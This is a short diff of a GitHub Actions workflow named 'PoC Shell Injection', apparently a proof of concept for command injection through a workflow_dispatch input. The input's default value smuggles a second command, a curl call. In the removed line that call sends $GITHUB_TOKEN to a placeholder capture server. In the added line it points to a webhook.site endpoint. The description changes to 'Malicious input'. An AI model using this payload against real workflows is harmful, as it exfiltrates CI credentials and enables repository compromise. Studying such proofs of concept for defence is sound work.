@@ -1,13 +1,11 @@
-# .github/workflows/test-injection.yml
 name: PoC Shell Injection
-
 on:
   workflow_dispatch:
     inputs:
       datasource:
-        description: "Test input"
+        description: "Malicious input"
         required: true
-        default: "; curl https://your-server.com/capture?data=$GITHUB_TOKEN"
+        default: "; curl https://webhook.site/caf4a700-0087-4ac1-9ff6-bee753baf1b4"
 
 jobs:
   test:
